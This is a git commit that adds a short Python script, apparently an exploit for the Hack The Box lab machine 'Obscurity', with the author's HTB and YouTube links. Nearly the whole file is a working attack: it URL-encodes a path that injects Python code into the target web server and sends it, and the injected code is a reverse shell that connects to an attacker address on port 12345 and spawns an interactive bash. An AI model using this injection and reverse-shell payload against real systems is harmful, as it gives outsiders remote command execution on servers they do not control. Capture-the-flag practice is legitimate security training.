eed98ff02644fa3adf76f6e4c592025f23e34c5f
Tatik <62120628+Tatik07@users.noreply.github.com>
2020-03-15 04:49:38 +0300

    Create Obscurity-Shell.py
    edit ip adress 10.10.x.x

---
+++ Obscurity-Shell.py
@@ -0,0 +1,19 @@
+import requests
+import urllib
+import os
+
+url = 'http://10.10.10.168:8080/'
+
+path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.x.x",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
+
+payload = urllib.parse.quote(path)
+print("payload")
+print(url+payload)
+
+r= requests.get(url+payload)
+print(r.headers)
+print(r.text)
+
+#-----T4TİK-----#
+# HTB --> https://www.hackthebox.eu/home/users/profile/269008
+# Youtube ---> https://www.youtube.com/channel/UCACEvhkVqbQmzCsyRChX0Pg
